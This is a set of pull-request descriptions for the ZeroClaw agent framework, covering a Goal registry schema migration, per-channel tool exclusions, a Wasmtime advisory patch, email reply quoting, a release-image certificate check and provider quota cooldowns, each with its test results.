Selected slice **01**, head `1b64f2d051be0e4b26dbe4e78c90634868aecc14`, compared with pinned upstream `ece3b744e65046a7a528b9e41d7154c04248c2ba`. This update merges that upstream revision into the existing branch without rewriting published history. The first PR has no predecessor. Do not enable an incomplete Goal implementation.

- **Base branch:** `master` (all contributions).
- **What changed and why:**
  - Move the canonical task types into `zeroclaw-api`, preserving runtime re-exports and enum variants; add serde-defaulted session/epoch fields.
  - Replace unguarded Goal creation/pause/resume APIs with exact task/session/epoch-guarded transitions, pending-operation settlement and accounting-state contracts; generic task APIs reject Goal creation and session-Goal mutations.
  - Converge existing task databases transactionally to schema 13, including session uniqueness/fencing triggers and failure classification of invalid legacy Goal rows.
  - Reconcile dead-owner Goals before generic startup recovery; retain terminal session-Goal history during agent deletion and refuse the control-plane cleanup step while a live session Goal exists. That refusal is reported as a cascade warning, not a rollback of the already-published agent deletion.
  - Add file-backed control-plane and task-type compatibility tests; propagate SQLite iteration errors rather than silently returning partial task/settlement lists.
- **Scope boundary:** First incremental slice of an unmerged proposal stack. No complete Goal workflow, user entrypoint, later configuration/commands, policy/execution crate, or enabled-rollout claim. The upstream merge preserves this foundation delta; this is not a correctness audit of all incoming upstream changes.
- **Blast radius:** Public Rust task/Goal registry interfaces, SQLite schema/recovery, generic mutation/error paths, agent deletion and ordinary delegate/peer/subagent producers. Public record/trait compatibility changes and one-way migration limits are detailed below.
- **Linked issue(s):** Related RFC #8303 and tracker #10341, not closing either.
  https://github.com/zeroclaw-labs/zeroclaw/issues/8303
  https://github.com/zeroclaw-labs/zeroclaw/issues/10341

### What this does, simply

The previous Goal registry did not bind its create/pause/resume operations to a durable session and execution epoch. This slice supplies those fences and the shared task/storage foundation so stale work cannot use ordinary task APIs to change a session Goal. It does not yet expose a complete Goal feature.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A — no user-reachable Goal entrypoint or task-store CLI has a meaningful manual A/B path in this foundation slice. File-backed integration tests exercise storage/recovery; no manual or live-session execution is claimed.

### How I tested

- **CI checks relied on and why they cover this change:** [Quality Gate run 39819119323](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/39819119323), attempt 1, tested head `1b64f2d051be0e4b26dbe4e78c90634868aecc14` as merge commit `4374d8cd706bb904ff329ecca0b123191d4c620d` against `master` at `8f03c962dc45231db567fe67c168e7aae95f806d`. Its executed product jobs passed, including the full default workspace Test, all six parallel runtime/channel repetitions, lint, platform/feature checks and security. **The run is not green:** Windows selection was cancelled by a setup timeout, and CI Required Gate failed because of that cancellation. The old `5ff2ad3c` run is historical only.
- **Known CI coverage gap, if any:** `Select required Windows jobs` exceeded its five-minute job budget during setup; checkout consumed 4m39s, scope-contract tests passed, and Rust toolchain setup was cancelled before selection ran. `Windows Service Smoke`, `Test Windows task-owner recovery` and `Check x86_64-pc-windows-msvc` were skipped without completed selection; their coverage is not claimed. A targeted rerun was refused by GitHub (HTTP 403), so no retry ran; a maintainer with Actions write permission must rerun that job and dependent checks. The local Cargo failures below remain separate and unresolved in cause. No full Goal controller, verifier, surface adapter or enabled-rollout behavior exists in this slice. Core/CODEOWNERS reviews and the scoped runtime exception remain outstanding.
- **Commands run and tail output:** Local validation on the stated head, Rust/Cargo 1.98.1:

| Command / check | Observed result |
| --- | --- |
| `cargo fmt --all -- --check` | PASS |
| `cargo test --locked --workspace --exclude zeroclaw-desktop` | FAIL, exit 101; stopped on #11959 |
| Same full workspace command with `--no-fail-fast` | FAIL, exit 101; 12 failed tests across five targets; reached final doc-tests |
| `./scripts/ci/parallel_runtime_test_gate.sh` | PASS; all three runtime and all three channel repetitions, 16 threads |
| `./scripts/ci/rust_quality_gate.sh` | PASS |
| `cargo clippy --locked --workspace --exclude zeroclaw-desktop --all-targets -- -D warnings` | PASS |
| `./scripts/ci/firmware_protocol_gate.sh` | PASS; formatting, strict Clippy and 28 tests |
| `bash scripts/ci/comment_hygiene_gate.test.sh` | PASS; 58 cases |
| `bash scripts/ci/comment_hygiene_gate.sh` | PASS |
| `cargo deny check` (0.20.2) | PASS with existing-policy warnings |
| `cargo audit` (0.22.2) | PASS with six allowed unmaintained-package warnings |

Relevant literal output:

```text
error: 5 targets failed:
    `-p zeroclaw-config --lib`
    `-p zeroclaw-gateway --lib`
    `-p zeroclaw-providers --lib`
    `-p zeroclaw-runtime --lib`
    `-p zerocode --bin zerocode`

test result: ok. 5801 passed; 0 failed; 9 ignored; 0 measured; 0 filtered out; finished in 39.11s
test result: ok. 2005 passed; 0 failed; 2 ignored; 0 measured; 0 filtered out; finished in 14.51s

58 passed, 0 failed
Comment hygiene gate passed.
advisories ok, bans ok, licenses ok, sources ok
warning: 6 allowed warnings found
```

The runtime and channel lines above are literal examples from the first runtime and final channel repetition. All three runtime runs reported the same 5,801/0/9 counts and all three channel runs reported the same 2,005/0/2 counts. The `--no-fail-fast` run separately observed all 26 file-backed Goal contract cases, four task API cases, 14 peer-tool cases and 13 named runtime cases passing. Those observations do not make its aggregate result pass.

**Full frozen-upstream comparison:** One unfiltered `cargo test --locked --workspace --exclude zeroclaw-desktop --no-fail-fast` run on the pinned upstream revision used the same toolchain and environment. Five candidate failure signatures matched exactly. Six candidate failures passed upstream; one same-named test failed with a different location/message. Consequently these **seven candidate signatures remain unmatched and uncertain**:

1. `ws::tests::websocket_handler_projects_anthropic_empty_terminal_stream_as_user_error`.
2. `anthropic::tests::anthropic_factory_forwards_timeout_to_native_provider`.
3. `factory::tests::openai_factory_forwards_timeout_to_native_provider`.
4. `factory::tests::responses_factory_forwards_timeout_secs_to_responses_provider`.
5. `openai::tool_round_policy_tests::native_tool_round_flags_reach_stream_and_chat_wires_without_changing_defaults` — candidate timeout versus upstream decode/missing-choices failure.
6. `hooks::builtin::webhook_audit::tests::legacy_runner_path_delivers_audit_event_with_null_arguments`.
7. `security::auth_provider::enrollment::tests::loopback_listener_ignores_wrong_state_and_returns_the_matching_code`.

Static tracing found no reachable changed candidate path for the first five. The two runtime cases retain possible same-process scheduling coupling. Their success in three later parallel runtime runs does not establish their cause. None is relabeled PASS or conclusively upstream-caused.

The five exact baseline matches were the null-device fixture collision (#11959), Grok fake-child start timeout, OpenAI model-listing/header expectation, OpenAI proxy hit count, and ZeroCode transport polling assertion. Upstream also had six upload-test failures that were not observed on this candidate; no cause is attributed to this PR from that difference. The filesystem fixture remains unchanged and tracked separately; macOS filesystems may be case-sensitive or case-insensitive.
https://github.com/zeroclaw-labs/zeroclaw/issues/11959

**Warnings retained:** Both candidate and baseline emitted the Apple linker `__eh_frame` size/performance warning. Deny reported six unmatched skips and two unused-wrapper exceptions under unchanged policy. Audit allowed six unmaintained-package warnings: anymap2, nostr-relay-pool, proc-macro-error, zbus_names, zvariant and zvariant_derive. No advisory ignore or security policy was changed.

### Current remote CI observations — separate from the local Cargo results

The [Test job](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/39819119323/job/119965354571) ran `cargo nextest run --locked --workspace --exclude zeroclaw-desktop`: 19,360 passed, 42 skipped, including all 26 file-backed Goal contract cases and four task API cases. Its separate hardware suite passed 189 with one skip, and informational golden replay passed seven with five skips.

prs.title: fix(channels): honour a channel instance's excluded_tools
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `ChannelsConfig::excluded_tools_for(channel, alias)` reads the `excluded_tools` list of a channel instance. `channel` is the runtime kind (`voice-call`) or the config key (`voice_call`). It covers every channel type listed by `ChannelsConfig::channels()`. Twitch and plugin channels have no such field and return an empty list; an unknown type returns `None`.
  - In the orchestrator, one helper, `channel_turn_excluded_tools`, computes a turn's excluded tools: the risk profile's list (lifted for CLI turns and `Full` autonomy, exactly as before) plus the list of the instance the message arrived through. Both places that built the per-turn list now use it, so the channel's list reaches the native tool specs, tool execution and the skills section, the same as the profile's.
  - Until now the per-channel setting was documented (channels overview table, security/autonomy.md) and present on every channel config, but nothing read it.
  - The restriction also follows the work a turn starts. It travels with the task (`security::channel_restriction`, modelled on the SOP step scope), and every tool loop merges it into its excluded tools in `run_tool_call_loop_impl`. So a bounded delegate, a sub-agent or an inline `cron_run` launched from a restricted channel can't use what the channel excludes, whatever tool set it assembles. Background and parallel delegation capture it before the spawn and restore it inside.
  - Work the restriction can't follow is refused on a channel that sets `excluded_tools`: cron and scheduled jobs, SOP steps, peer and A2A messages, external agent CLIs, and `execute_pipeline`. The new `[channels] restricted_channels_allow_detached_work = true` allows it again.
- **Scope boundary:**
  - The channel's own list applies at every autonomy level, including `Full`. It's an explicit restriction on that channel, not part of the risk profile; autonomy.md now says so.
  - A message that names no instance gets the union of all instances of its type, so it is never less restricted than the strictest instance.
  - The agent's startup prompt tool list is built once per agent and is not per channel, so in text-protocol tool mode an excluded tool can still be described there. It's still neither offered as a native spec nor executable.
  - No change to risk profiles, approvals or peer groups.
- **Blast radius:** channel turns of any agent whose channel instances set `excluded_tools`. Configs that don't set it behave exactly as before.
- **Linked issue(s):** Closes #11989

### What this does, simply

Each chat or mail channel has a setting to hide certain tools from the assistant when it answers on that channel, for example "no web requests on the public inbox". The setting was documented but did nothing. Now it works. It adds to the agent's usual restrictions and applies even to an agent that otherwise has full autonomy.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The unit tests cover the lookup across every channel type and the merge used by both per-turn call sites.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-config` and `zeroclaw-channels`.
- **Known CI coverage gap, if any:** None.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                         ok
cargo test -p zeroclaw-config --lib -- every_listed_channel_type_answers_excluded_tools channel_excluded_tools_are_read_per_instance
  test result: ok. 2 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- a_channel_turn_drops_the_tools a_channel_exclusion_holds assemble_channel_agent_tools excluded
  test result: ok. 12 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings    ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config   ok
bash scripts/ci/comment_hygiene_gate.sh                                             passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - `every_listed_channel_type_answers_excluded_tools`: every kind and config key from `channels()` has a lookup arm, so a new channel type without one fails this test.
  - `channel_excluded_tools_are_read_per_instance`: per-instance lists, an unknown alias, and the union without an alias.
  - `a_channel_turn_drops_the_tools_its_channel_excludes`: profile plus channel list for the right instance only, and not for another channel type.
  - `a_channel_exclusion_holds_at_full_autonomy_and_without_an_alias`.
  - `a_restricted_channel_refuses_detached_work_unless_allowed` and `a_loop_started_from_a_restricted_turn_inherits_the_restriction`.
  - `security::channel_restriction` tests: no restriction outside a channel turn, merge into a loop's exclusions, a captured restriction surviving a spawn.
  - The existing `delegate`, `spawn_subagent` and SOP scope tests (291 in the filtered runtime run) still pass.

  Not verified: a live channel turn on this branch.
- **Visual interface evidence:** N/A

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No. It only removes tools from channel turns.
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No. This narrows what a turn from an untrusted channel can do, which is the mitigation the setting was documented to provide.

## Compatibility (required)

- Backward compatible? Yes for configs that don't set the field. A config that already sets per-channel `excluded_tools` now gets the restriction it asked for.
- Config / env / CLI surface changed? Yes: an existing field starts working, and one new optional key, `[channels] restricted_channels_allow_detached_work` (default `false`).
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: `git revert <sha>`, or remove the per-channel `excluded_tools` entries.

- **Observable failure symptoms:** a tool missing on a channel that should have it would mean a per-channel `excluded_tools` entry is listing it.

prs.title: fix(deps): patch Wasmtime 48.0.7 for RUSTSEC-2026-0375..0379
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - Bump `wasmtime`, `wasmtime-wasi` and `wasmtime-wasi-http` from 48.0.6 to 48.0.7 in `crates/zeroclaw-plugins/Cargo.toml`, and re-lock. Five RustSec advisories against 48.0.6 now fail `cargo audit` in the Security job on every PR:
    - RUSTSEC-2026-0378 (`wasmtime`): panic lowering a host-created component model stream into a guest that expects a different payload type
    - RUSTSEC-2026-0379 (`wasmtime`): Cranelift on aarch64 can jump to the wrong target on a large `br_table`
    - RUSTSEC-2026-0375 (`wasmtime-wasi-http`): p3 guests can set an incorrect content-length for spliced response bodies
    - RUSTSEC-2026-0376 (`wasmtime-wasi-http`): guests can add conflicting content lengths
    - RUSTSEC-2026-0377 (`wasmtime-wasi-http`): p3 forwarded trailers aren't checked against `is_forbidden_header`
  - Each advisory names 48.0.7 as a fix within 48.x, so this stays a patch-level move, the same as the 48.0.4 to 48.0.6 bump in #11755.
- **Scope boundary:** only the wasmtime family moves in `Cargo.lock`: 30 packages, all 48.0.6 to 48.0.7, or 0.135.6 to 0.135.7 for Cranelift. No move to 49.x, and no other dependency changes.
- **Blast radius:** the WASM plugin host. As with any wasmtime patch release, precompiled `.cwasm` components are tied to the exact wasmtime version, so runtime-only builds need components precompiled for 48.0.7.
- **Linked issue(s):** Related #11755, Related #11475, Related #11925 (separate TLS remediation).

### What this does, simply

ZeroClaw's plugin host uses Wasmtime to run WASM plugins. Five security fixes for the version we pin were published on 19/10, and the security check now fails every pull request until we take them. This moves to the patched release in the same 48.x line and changes nothing else.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. This is a lockfile-level patch bump. The Security job and the plugin tests cover it.

### How I tested

- **CI checks relied on and why they cover this change:** The [required CI run](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/39416898134) passed on a83882e71163af3542f20c8b2f411785332913b6 on 2026-10-20, including Security, plugin tests, and the Cranelift, Pulley, runtime-only and artifact-smoke checks. This is exact-head build/test evidence; its historical Security result does not establish cleanliness against later advisory updates.
- **Known CI coverage gap, if any:** No rebuilt release or installed precompiled-plugin rollout is verified here. The current advisory database reports four unchanged TLS findings on this lockfile; those are separate from the five Wasmtime findings cleared here and are addressed in #11925. Fresh merge-queue checks remain required.
- **Commands run and tail output:** Author-reported validation before the later TLS advisory publication:

```text
cargo audit                                             exit 0 (master's Cargo.lock: exit 1 on RUSTSEC-2026-0375..0379)
cargo test -p zeroclaw-plugins --features plugins-wasm-cranelift --locked
  test result: ok. 417 passed; 0 failed   (lib)
```

prs.title: feat(channels/email): quote the original message in replies
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - New per-channel flag `quote_original` on `[channels.email.<alias>]`, off by default. When it is on, a reply to a message the channel received quotes that message below the agent's text, the way mail clients do: an `On <date>, <sender> wrote:` line, then the original as `>` lines in the plain part and as a `<blockquote>` in the HTML part, HTML-escaped. Replies already thread through `In-Reply-To` / `References`, but the body was only the agent's text, so the reader had nothing under the answer.
  - The quote is what the channel itself parsed from the inbound message: sender display name, `Date` and body text. It's held in a bounded in-memory map keyed by Message-ID: 256 messages, oldest dropped first, each quote capped at 20,000 characters on a char boundary. The map is filled in `dispatch_email` after the allowlist and duplicate checks, so a blocked sender's mail is never stored.
  - It deliberately doesn't use `ChannelMessage.content`, which the runtime may have enriched by the time `SendMessage::reply_to` runs, and it doesn't add a field to the channel-neutral `SendMessage`.
- **Scope boundary:**
  - No CC or reply-all; that's #9506.
  - No quoting across restarts: a reply to a message received before the daemon restarted goes out without a quote, and the docs say so.
  - The original's HTML is not quoted verbatim; the quote is built from the parsed text.
  - `send_via`, cron announcements and other non-reply sends are unchanged. `build_email_message` is the only place that builds outbound email bodies, and Gmail push sends through the IMAP+SMTP channel.
- **Blast radius:** `zeroclaw-config` (one `EmailConfig` field) and `zeroclaw-channels` (`email_channel.rs`). No API or orchestrator change. With the flag off, the outbound plain and HTML bodies are exactly what they are today. Several open email-channel PRs also edit `email_channel.rs` (#11746, #11748, #11750, #11752, #11762, #11763); whichever lands second rebases, and this change sits in its own functions to keep that small.
- **Linked issue(s):** Closes #11938. Related #9506

### What this does, simply

When an assistant answers an email, the reply now can look like a normal email reply: the assistant's answer on top, and the message it's answering quoted underneath. Without it, someone reading "yes, done" has to dig through their sent folder to see what it refers to. It's a switch per mailbox and off unless you turn it on. Only messages the assistant received since it last started can be quoted.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The tests drive a raw email through dispatch and `SendMessage::reply_to` to the sent message, which is the path a live reply takes.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change.
- **Known CI coverage gap, if any:** `markdownlint-cli2` couldn't run locally (no Node); the docs-quality gate's em-dash check passed and CI's docs job covers the lint.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                    ok
cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions
  test result: ok. 1 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- email_channel
  test result: ok. 81 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings   ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config  ok
bash scripts/ci/comment_hygiene_gate.sh                                        passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - the flag defaults off
  - the exact plain and HTML shape of a quoted reply, with HTML escaping
  - a reply without a `Date` still names the sender
  - no quote when the flag is off, the message is unknown, or the send has no `in_reply_to`
  - the quote is present in the sent message's wire form
  - a raw email through `dispatch_email` and `SendMessage::reply_to` produces the quote
  - a blocked sender's mail is never stored
  - eviction past 256 messages
  - the 20,000-character cut lands on a char boundary

  Not verified: a live reply on this branch.
- **Visual interface evidence:** N/A (mail body text; the tests assert the exact plain-text output and the HTML structure).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No (fixtures use `example.invalid`)
- Prompt injection or untrusted model-visible text introduced/changed? No. The quoted text goes only into the outbound mail; it is never fed back to the model. The original is HTML-escaped in the HTML part.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes: one optional key, `quote_original`, default `false`. Existing configs are unaffected.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: set `quote_original = false`, or `git revert <sha>`.

prs.title: ci(security): check release image certificate rejection
prs.body:
## Summary

- **Base branch:** `master`.
- **What changed and why:**
  - Check each final release-image digest on every published platform before signing, including the generated image matrix, zerorelay, and stable distroless/Debian images.
  - Reject the compromised emSign and AAA certificate paths in both the shipped bundle and individual packaged CA files. Require valid fixture controls, an unaffected shipped anchor, and strict certificate parsing.
  - Reuse already-loaded PR smoke images. Checker/test-only changes run offline tests and cheap prebuilt-image checks without selecting the Rust source matrix.
- **Scope boundary:** This increment adds validation; #11925 owns the trust-store repairs and Rust verifier tests. Trivy remains report-only. Application TLS requests and operator-mounted trust stores are outside this check.
- **Blast radius:** Existing Docker jobs inspect their image filesystems; publishing jobs pull the built digest and can fail before signing. No new CI job, Python dependency, or product runtime code.
- **Linked issue(s):** Depends on #11925. Related #11932. The daily full-lockfile scan is covered separately by #11927 for #11926.

### What this does, simply

A corrected package or filter does not prove that a final container ships the corrected trust store. This check reads the packaged certificates and verifies that both incident chains fail for missing trust while an unaffected anchor still works.

The sequence is `build/push → check each digest/platform → sign`. Tags are already pushed when checking starts; failure prevents signing and successful job completion, not publication of those tags.

The implementation is a 256-line standard-library checker plus 286 lines of offline tests, reusing #11925's incident fixtures. In the previous hosted run, certificate steps took 0–2 seconds while the eight existing source lanes consumed approximately 271 runner-minutes. Checker-only edits now avoid that matrix, and source-image checks only inspect images already loaded for smoke tests. Release checks still cover every published variant/platform.

This is stacked on #11925 at b3006925bc6fc987084ee5498c8d1902aee9a9ae; merge that dependency first. The checker increment starts at 3137d35a10724a7ac6011112163bab6267976ada.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes; a working Docker daemon provides direct final-image evidence.
- **Interface(s) exercised:** `surface=cli`, developer tooling.
- **Setup / preconditions:** Python 3.9+, OpenSSL 3, and Docker; set `OPENSSL` if the default executable is LibreSSL.
- **Steps to run:** Run `python3 scripts/ci/check_image_certificates_test.py`, then `python3 scripts/ci/check_image_certificates.py IMAGE --platforms linux/amd64`. Add `--pull` and use an immutable registry digest for published images.
- **Expected on this branch (after):** Clean trust passes; restoring either incident root or adding a malformed certificate fails. Requested platforms are checked and temporary containers are removed.
- **Prior behavior on master (before):** No final-image rejection gate exists. The offline suite supplies clean/regressed filesystem fixtures with otherwise identical valid certificate chains.

### How I tested

- **CI checks relied on and why they cover this change:** [Previous Docker run on abbee635fc](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/39702461343) passed all 11 jobs, including real export/verification of both prebuilt images and all eight source rows. [Docker CI on 6c3869c838](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/39814886672) is pending. Existing required CI remains unchanged.
- **Known CI coverage gap, if any:** Production release publishing/signing was not dispatched. Local Docker is unavailable, so real Docker evidence comes from hosted CI; local CLI tests fake the Docker service and use real OpenSSL. Smoke images do not prove application TLS handshakes.
- **Commands run and tail output:** On 6c3869c838, with `OPENSSL` selecting OpenSSL 3:

```text
python3 scripts/ci/check_image_certificates_test.py
  Ran 16 tests ... OK (Python 3.9 and bundled Python)
ruff check scripts/ci/check_image_certificates.py scripts/ci/check_image_certificates_test.py
  All checks passed!
ruff format --check scripts/ci/check_image_certificates.py scripts/ci/check_image_certificates_test.py
  2 files already formatted
scripts/ci/docs_quality_gate.sh
  Summary: 0 error(s)
scripts/ci/docs_links_gate.sh
  Ran 6 tests ... OK; no added links
git diff --check
  exit 0
```

  Docs gates used `DOCS_FILES=docs/book/src/maintainers/ci-and-actions.md` and `BASE_SHA=b3006925bc6fc987084ee5498c8d1902aee9a9ae`. Actionlint 1.7.12 with ShellCheck reports no diagnostics for Docker PR/publish workflows and four unchanged SC2016/SC2094 diagnostics in stable-release steps; comparison against the dependency base confirms no new diagnostics.
- **Beyond CI, what did you manually verify?** Executed the actual selector shell for 13 changed-file sets. Checker, tests, checker plus docs, and publishing workflows select zero source rows; mixed source inputs retain seven/eight rows; Compose-only and Containerfile-only changes retain one row. Compiled the unchanged `tests/architecture/container_release.rs` directly with `rustc --edition=2024 --test` and cached `serde_json`/`toml` dependencies: all 14 tests pass, including the two that failed on the prior unconditional image-load setting.
- **Visual interface evidence:** Exact plain-text CLI output; no presentation-sensitive changes.
- **Tested revision, interface, and evidence path:** 6c3869c8385a87b0e63a35af8291266bf6d358ef; checker CLI regressions in `scripts/ci/check_image_certificates_test.py`. Prior hosted image evidence is explicitly identified above.
- **Screenshot or exact-output evidence:** Passing cases print `PASS unaffected shipped trust anchor` per platform; restored roots fail with `must fail for missing trust (exit 0)`; mixed malformed DER fails with `malformed certificate`.
- **Action or changed state and observed result:** Tests cover both compromised roots, individual CA files, malformed DER before/after a valid anchor and outside the bundle, missing stores, expiry/tool errors, platform/export failures, cleanup, and trailing archive padding.
- **If any command was intentionally skipped, why:** No full local Rust rebuild for this Python/workflow increment; the existing container contract module was run directly. No production release was dispatched.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No new Actions permissions or host mounts; existing Docker jobs read their own image filesystems.
- New external network calls? Yes; release checks pull each just-built digest/platform using existing registry authentication.
- Secrets / tokens / credentials handling changed? No.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No; the new control is a synthetic public certificate with its private key discarded.
- Prompt injection or untrusted model-visible text introduced/changed? No.
- If any `Yes`, describe the risk and mitigation: Pulls use immutable build digests. Verification is offline, host CA defaults are disabled, and archives are read without extracting paths or executing image binaries.

## Compatibility (required)

- Backward compatible? Yes for product behavior; CI now enforces this regression.
- Config / env / CLI surface changed? Yes, developer-only checker CLI and optional `OPENSSL` override.
- Rust/MSRV/toolchain floor changed? No.
- If backward compatibility is `No` or either surface/floor question is `Yes`: Local checker users need Python 3.9+, OpenSSL 3, and Docker. No application migration.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert 6c3869c838 abbee635fc 3137d35a10` removes this validation increment while retaining #11925's repairs. Investigate a rejected image before signing or deploying it.

prs.title: fix(providers): keep a quota provider out until its stated reset
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `ReliableModelProvider` now reads a stated reset time from a 429 body (`resets_in_seconds`, or `resets_at` as unix seconds). OpenAI Codex sends this when a subscription seat's rolling window is used up, and the window can last hours.
  - When a reset is stated, the provider's cooldown runs until that time, capped at 6 hours, instead of the 10 s default or the 60 s Retry-After cap. A wrong or stale value therefore cannot sideline a provider for days.
  - A non-retryable (business quota) 429 that states a reset now also sets that cooldown. Today it moves to the next provider but sets no cooldown, so the exhausted provider is asked again on every call until the window resets.
- **Scope boundary:** 429s without a stated reset behave exactly as today, including Retry-After parsing and its 60 s cap, and business quotas without a reset are still tried each turn. Single-provider chains set no cooldown on the non-retryable path, as before. This PR does not change error classification (#11767) or carry response headers into the error (#11768).
- **Blast radius:** provider fallback ordering in `reliable.rs` only, on the four non-streaming call paths (`chat_with_system`, `chat_with_history`, `chat_with_tools`, and `chat_with_tool_round_policy`). Streaming methods honor an existing cooldown but do not establish a new cooldown from a stream error in this change. Only a 429 handled by those non-streaming paths whose body contains one of the two reset keys behaves differently.
- **Linked issue(s):** Closes #11894. Related #11767, Related #11768, Related #10779

### What this does, simply

When a Codex subscription runs out, Codex says when it will be available again, often around two hours later. ZeroClaw ignored that and kept asking Codex first on every message, got the same refusal, then fell back. Each turn paid an extra failed round trip, and the logs filled with the same error. With this change ZeroClaw remembers the stated reset time and goes straight to the fallback until then, never for more than six hours. Nothing changes for providers that don't state a reset time.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. Reproducing it live needs an exhausted Codex seat; the unit tests below drive the same chain with the real Codex 429 body.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-providers` runs the new chain-level tests; clippy and fmt cover the rest.
- **Known CI coverage gap, if any:** None. The change is provider-local and covered by unit tests through the public `chat` path.
- **Commands run and tail output:**

```text
cargo fmt -p zeroclaw-providers -- --check                         ok
cargo test -p zeroclaw-providers --lib -- stated_reset exhausted_seat business_quota_refusal rate_limit cooldown
  test result: ok. 18 passed; 0 failed
cargo test -p zeroclaw-providers --lib
  test result: ok. 1984 passed; 0 failed; 4 ignored   (at 3cc3bdc994; see the openai.rs note below)
cargo clippy -p zeroclaw-providers --tests --no-deps -- -D warnings  ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-providers ok
```

- **Beyond CI, what did you manually verify?** New tests:
  - `stated_reset_is_read_from_the_quota_body`: parses the Codex body and a `resets_at` body. It returns nothing for a body without either key, or for a reset that is already due.
  - The cooldown test also checks that a stale `resets_at` next to `Retry-After: 30` gives 30 s.
  - `a_stated_reset_sets_a_long_bounded_cooldown`: 7144 s is kept as is, a larger value is capped at 6 hours, and a plain Retry-After of 600 s still caps at 60 s.
  - `an_exhausted_seat_is_skipped_until_its_stated_reset`: across two turns, the primary returning the Codex 429 is called once, and the fallback answers both turns.
  - `a_business_quota_refusal_with_a_stated_reset_is_skipped_until_then`: the same, for a non-retryable quota body with a reset.
  - `a_business_quota_refusal_without_a_reset_is_still_tried_each_turn`: without a reset, the primary is called on both turns and no cooldown is set, matching today.

  Not verified: a live exhausted Codex seat on this branch. The body in the tests is the one we saw from Codex on a v0.8.5 build.
- **Unrelated local failure:** `native_tool_round_flags_reach_stream_and_chat_wires_without_changing_defaults` in `openai.rs` failed in two of three full-suite runs on my machine, once with a refused connection to its local mock server and once on its 5 s timeout. It passed 3 out of 3 when run alone. This PR doesn't touch `openai.rs` or the code that test drives, so I read it as a timing flake under load.
- **Visual interface evidence:** N/A
- **If any command was intentionally skipped, why:** The full workspace test run was skipped because the change is confined to `zeroclaw-providers`.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? No
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: `git revert <sha>`.
